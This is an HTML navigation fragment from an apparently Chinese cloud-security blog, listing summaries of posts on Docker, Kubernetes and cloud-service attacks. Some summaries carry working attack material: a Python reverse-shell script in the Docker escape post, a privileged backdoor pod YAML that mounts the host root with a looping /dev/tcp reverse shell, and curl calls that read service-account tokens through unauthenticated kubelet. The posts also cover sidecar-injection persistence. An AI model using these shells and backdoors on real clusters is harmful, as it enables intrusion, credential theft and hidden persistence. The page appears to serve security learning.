+服务发现和负载均衡：默认方案
+机密和配置管理：对敏感数据或其他进行配置管理
+存储编排：虚拟磁盘与物理磁盘
+批处理：批量任务实现
+k8s工作流程 kubectl 是 k8s 的客户端工具，可以使用命令行管理集群
+">K8s渗透入门从零到一</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/kubernetes%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="article-link" data-summary="Kubernetes安全基础 文章首发于track安全社区：K8s渗透入门从零到一
+k8s基础 k8s架构 Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台
+k8s基本架构如下： 从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点
+master节点主要有以下核心组件：
+etcd 保存了整个集群的状态 API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制 Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等 Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上 node节点有以下核心组件：
+Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份
+Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等
+Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡
+pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod
+fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。
+Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源
+这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器
+k8s特点 和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理
+k8s具有如下的特点：
+自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启
+弹性伸缩：容器数量的控制
+自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新
+服务发现和负载均衡：默认方案
+机密和配置管理：对敏感数据或其他进行配置管理
+存储编排：虚拟磁盘与物理磁盘
+批处理：批量任务实现
+k8s工作流程 kubectl 是 k8s 的客户端工具，可以使用命令行管理集群
+">Kubernetes安全基础</a>
+      
+    </li>
+  
+</ul>
+
+        </div>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
+常见名词 记录一些常见的专业术语的意思
+容器 这玩意打CTF的应该都比较熟悉
+Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
+Docker 容器与虚拟机类似，但二者在原理上不同:
+容器是将操作系统层虚拟化 虚拟机是虚拟化硬件 按照上面的比较，可以知道容器能更便携高效地利用服务器
+接下来一下Docker官方给出的架构图：
+可以看见里面包括了Docker客户端、Docker容器所在宿主机、Docker镜像仓库三部分
+而宿主机包括了Docker守护进程、本地容器、本地镜像，Docker守护进程Dockerd的作用是侦听Docker API请求和管理Docker对象
+容器编排 容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利
+常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等
+无服务 无服务（serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，简单来说，就是开发者不用去管服务器只负责开发就行
+无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的 Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等
+微服务 微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信
+服务网格 服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互
+云原生安全 云原生 云：运行在云服务器上 原生：将应用运行到云上，充分的利用云自身的特点，比如弹性和分布式优势（且业务按照云来设计，而不是简单迁移） 云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API
+云原生安全 云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。
+根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：
+容器安全 编排系统安全 云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等 另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。
+">云原生基础知识</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
+国内云厂商：
+阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
+AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
+S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别 EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机 RDS云数据库（Relational Database Service），简单理解为云上数据库 IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限 综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究
+在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用TerraformGoat靶场进行演示
+学习顺序参考https://wiki.teamssix.com/
+对象存储 对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议
+Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
+Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
+AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
+">云服务学习</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟主机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
+虚拟主机 虚拟主机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
+注意：虚拟主机（Virtual Hosting）和虚拟机（Virtual Machine）是两个不同的概念，虚拟机是一个完整的虚拟化系统，包括操作系统、软件和硬件，可以在单个物理服务器上运行多个操作系统实例
+Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
+K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
+二、思路 如果shell处于虚拟主机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
+虚拟主机：通常考虑横向移动来扩大攻击效果
+Docker：通常先进行容器逃逸，再进行内网横向移动
+K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
+三、识别 首先判断当前shell是否采用了虚拟化技术：
+systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
+查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
+hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
+cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
+grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
+通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
+ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
+通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
+mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
+通过查看硬盘信息，推断当前环境是否为容器环境:
+fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
+获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
+df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
+通过检查环境变量，了解特定环境的信息:
+env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
+">识别虚拟主机、Docker和K8s集群环境</a>
+      
+    </li>
+  
+</ul>
+
+        </div>
+      
+    </li>
+  
+</ul>
+
+    
+  </div>
+  <div class="content-center">
+    <h1>My Hugo Knowledgebase</h1>
+    
+    
+    <div class="homepage-tree tree">
+        
+        
+    
+        
+          <ul class="tree-list">
+  
+    <li>
+      
+        <span class="tree-toggle expanded"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/" class="section-link"><strong>云安全</strong></a>
+        <div class="tree-children">
+          <ul class="tree-list">
+  
+    <li>
+      
+        <span class="tree-toggle expanded"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/" class="section-link"><strong>Docker安全</strong></a>
+        <div class="tree-children">
+          <ul class="tree-list">
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
+Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
+不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
+不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
+敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
+活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
+不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
+不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
+不安全的配置/挂载 正常来说，容器有两大隔离机制：
+linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
+&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
+UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
+普通用户被加到Docker用户组内
+如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
+Unix socket挂载到容器内部
+有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
+">Docker安全概览</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
+和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
+判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
+不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
+ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
+挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
+user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
+而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
+从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
+环境搭建 创建容器并挂载/proc目录：
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
+信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
+find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
+cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
+接下来安装vim和gcc：
+apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
+#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
+">Docker逃逸手法大全</a>
+      
+    </li>
+  
+</ul>
+
+        </div>
+      
+    </li>
+  
+    <li>
+      
+        <span class="tree-toggle expanded"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/" class="section-link"><strong>K8s安全</strong></a>
+        <div class="tree-children">
+          <ul class="tree-list">
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5/" class="article-link" data-summary="动态容器注入-一种隐蔽的k8s权限维持方法 恶意pod-&amp;amp;gt;反弹shell-&amp;amp;gt;挂载宿主机(node)/-&amp;amp;gt;cron写定时任务反弹shell-&amp;amp;gt;master-node
+k8s控制器
+众所周知，k8s的持久化有很多方法：
+部署后门pod 部署cronjob 部署shadowApiserver 部署恶意deployment 部署恶意deamonset 这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？
+这里就有一种叫做动态容器注入的方式
+目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中
+利用sidecar容器技术进行注入 这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/
+这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod
+为什么选择daemonset：
+它能够确保所有节点（包括新增节点）上都运行一个Pod
+如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod
+值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：
+容器是特权的（相当于docker run的时候带了–privileged选项）
+容器与宿主机共享网络和PID命名空间（打破命名空间隔离）
+容器内挂载宿主机根目录（打破文件系统隔离）
+这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了
+基础注入 一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：
+我们探测一下是否存在kube-proxy：
+kubectl get daemonset -n kube-system 我们也可以看到这个daemonset控制的pod：
+接下来我们来读这个daemonset的yaml：
+kubectl get daemonset -n kube-system -o yaml 我们可以在这个yaml基础上进行修改实现注入：
+我们先分析原yaml的spec：
+spec: revisionHistoryLimit: 10 selector: matchLabels: k8s-app: kube-proxy template: metadata: creationTimestamp: null labels: k8s-app: kube-proxy spec: containers: - command: - /usr/local/bin/kube-proxy - --config=/var/lib/kube-proxy/config.conf - --hostname-override=$(NODE_NAME) env: - name: NODE_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: spec.nodeName image: registry.k8s.io/kube-proxy:v1.30.14 imagePullPolicy: IfNotPresent name: kube-proxy resources: {} securityContext: privileged: true terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /var/lib/kube-proxy name: kube-proxy - mountPath: /run/xtables.lock name: xtables-lock - mountPath: /lib/modules name: lib-modules readOnly: true dnsPolicy: ClusterFirst hostNetwork: true nodeSelector: kubernetes.io/os: linux priorityClassName: system-node-critical restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: kube-proxy serviceAccountName: kube-proxy terminationGracePeriodSeconds: 30 tolerations: - operator: Exists volumes: - configMap: defaultMode: 420 name: kube-proxy name: kube-proxy - hostPath: path: /run/xtables.lock type: FileOrCreate name: xtables-lock - hostPath: path: /lib/modules type: &amp;amp;#34;&amp;amp;#34; name: lib-modules updateStrategy: rollingUpdate: maxSurge: 0 maxUnavailable: 1 type: RollingUpdate 我们只需要在此基础上增加两个新对象：
+">k8s权限维持-动态容器注入</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-link" data-summary="K8s渗透-信息搜集 文章首发于track安全社区：K8s渗透入门从零到一
+这一步发生在内网信息搜集的过程中，内网一般不会完全基于容器技术构建，所以内网搜集的起点一般可以分为权限受限的主机和物理主机内网
+k8s内部集群网络主要依靠网络插件，目前使用比较多的是Flannel和Calico
+而通信类型存在4种：
+同一pod内的容器间通信 不同pod间的通信 pod与service间的通信 集群外部的流量与service间的通信 shell环境辨别 如果我们的起点是一个在k8s集群内部权限受限的容器，那么内网探测的过程依然遵循常规内网探测，可以先在搜集的时候判断当前是否是云环境，可以参考我的笔记：快速识别虚拟主机、Docker和K8s集群环境
+一些常用命令：
+ps aux ls -l .dockerenv capsh --print env | grep KUBE ls -l /run/secrets/kubernetes.io/ mount df -h cat /proc/1/cgroup cat /etc/resolv.conf cat /etc/mtab cat /proc/self/status cat /proc/self/mounts cat /proc/net/unix cat /proc/1/mountinfo 这里的cat /proc/1/cgroup是分辨容器环境一个很实用的命令：
+没使用 Kubernetes 的 docker 容器，其 cgroup 信息格式如下：
+12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36 而k8s默认的cgroup信息格式如下：
+12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197 特权相关搜集 另外capsh --print获取到信息也较为重要，可以打印出当前容器里已有的 Capabilities 权限： 那如果没有capsh命令且无法安装怎么办呢？
+首先cat /proc/1/status 获取到 Capabilities hex 记录:
+然后在我们自己安装了capsh的主机上进行decode：
+如此即可达到代替capsh --print的效果
+">K8s渗透-信息搜集</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/" class="article-link" data-summary="K8s渗透-初始访问 文章首发于track安全社区：K8s渗透入门从零到一
+初始访问是攻防矩阵的第一步，可以简单理解为获取对k8s的访问权限
+APIServer未授权 insecure-port开启 典中典的k8s相关漏洞，APIServer在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权
+如果目标主机将APISevrer非安全端口8080暴露出来，便可以利用此端口进行对集群的攻击：
+直接访问8080端口，会返回可用的API列表：
+接下来需要用到kubectl，安装教程见官网
+使用kubectl可以获取集群信息：
+kubectl -s [ip]:[port] get nodes 上面这个案例可以看到有4个节点，其中有一个节点status为ready，可以成为后续执行阶段的入口点，比如利用kubectl调用该apiserver来创建恶意pod
+secure-port开启匿名访问 即6443安全端口的未授权访问
+若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为system:anonymous用户。
+一般来说system:anonymous用户权限是很低的，但是如果运维人员管理失当，把system:anonymous用户绑定到了cluster-admin用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令，这也算是变向的未授权了:
+我们可以通过kubectl进行apiserver调用：
+kubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info 当然有可能会遇到这种情况：
+这种时候可以使用浏览器curl去请求api接口查看响应的json都能达到类似效果：
+当然有个很好用的工具叫cdk也可以实现，有个kcurl参数功能是连接K8s api-server发起自定义HTTP请求：
+在匿名用户可以未授权访问6443端口的情况，，我们可以尝试访问/api/v1/namespaces/default/secret路由来尝试获取用户token：
+我们将这里的token字段进行base64解码后可以到到kubectl的6443安全端口进行操作，比如获取当前的权限：
+kubectl auth can-i --list --server=https://119.8.60.88:6443 --token=&amp;amp;#34;&amp;amp;lt;token值&amp;amp;gt;&amp;amp;#34; --insecure-skip-tls-verify 这里可以看到权限非常高
+打法和不安全端口8080未授权类似，这里不再细说
+kubectl proxy暴露 通过反向代理等方式进行端口转发将原本内网的未授权api server暴露到公网
+所以利用方式和apiserver未授权类似，这里不再细说
+kubelet未授权 kubelet和kubectl的区别？
+kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod
+每个节点都有一个kubelet服务，kubelet是在每个节点上运行的主要节点代理，监听了10250、10248、10255等端口，负责管理节点上的容器与master节点的通信，而10250端口就是kubelet与API Server进行通信的主要端口
+如果kubeconfig文件中的配置不当，则会导致系统存在kubelet未授权访问，在该情况下，攻击者能够列出当前运行的pod，对任意pod执行命令等，实现进一步的利用
+例如对服务账号绑定了cluster-admin权限的pod执行命令来读取服务账号的token，然后利用高权限token控制apiserver，创建恶意pod并逃逸
+通过请求接口执行命令读取token：
+curl -XPOST -k &amp;amp;#34;https://${K8S}:10250/run/&amp;amp;lt;namespace&amp;amp;gt;/&amp;amp;lt;pod&amp;amp;gt;/&amp;amp;lt;container&amp;amp;gt;&amp;amp;#34; -d &amp;amp;#34;cmd=cat /var/run/secret/kubernetes.io/serviceaccount/token&amp;amp;#34; etcd未授权 k8s使用etcd存储数据，默认监听2379端口，如果该端口暴露到公网且存在未授权访问，就可能导致信息泄漏，攻击者可以通过收集到的凭证来尝试接管集群，而由于本机可免认证访问2379端口，所以可以结合SSRF来打组合拳
+">K8s渗透-初始访问</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
+        <a href="/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%89%A7%E8%A1%8C/" class="article-link" data-summary="K8s渗透-执行 文章首发于track安全社区：K8s渗透入门从零到一
+执行阶段的主要任务是实现在集群内执行任意命令，获得shell
+kubectl exec进入容器 当我们能够控制apiserver时，和docker类似，我们可以使用命令进入容器的shell中执行命令：
+# apiserver未授权时 kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash # 获取到kubeconfig文件时 kubectl --kubeconfig config --namespace=default exec -it test-rev -- bash # 获取到高权限token时 kubectl --server=https://x.x.x.x:6443 --token=&amp;amp;#34;&amp;amp;lt;token值&amp;amp;gt;&amp;amp;#34; --insecure-skip-tls-verify --namespace=default exec -it test-rev -- bash 比如这里进入容器执行反弹shell命令
+成功监听到反弹shell：
+创建后门pod 获取初始访问权限后，通过创建后门pod来执行后续攻击，
+首先本机上新建个yaml文件用于创建容器，将节点的根目录挂载到容器的 /mnt 目录，并在容器启动后自动执行反弹shell命令，内容如下：
+apiVersion: v1 kind: Pod metadata: name: test-rev spec: nodeName: &amp;amp;lt;节点名称&amp;amp;gt; containers: - name: test-container image: ubuntu command: [&amp;amp;#34;/bin/sh&amp;amp;#34;] args: - &amp;amp;#34;-c&amp;amp;#34; - | apt update &amp;amp;amp;&amp;amp;amp; apt install -y bash netcat-openbsd &amp;amp;amp;&amp;amp;amp; \ bash -c &amp;amp;#39;while true; do bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/&amp;amp;lt;你的vps的公网IP&amp;amp;gt;/2333 0&amp;amp;gt;&amp;amp;amp;1; sleep 60; done&amp;amp;#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / 然后使用 kubectl 创建文件指定的恶意容器：
+">K8s渗透-执行</a>
+      
+    </li>
+  
+    <li>
+      
+        <span style="width: 15px; display: inline-block;"></span>
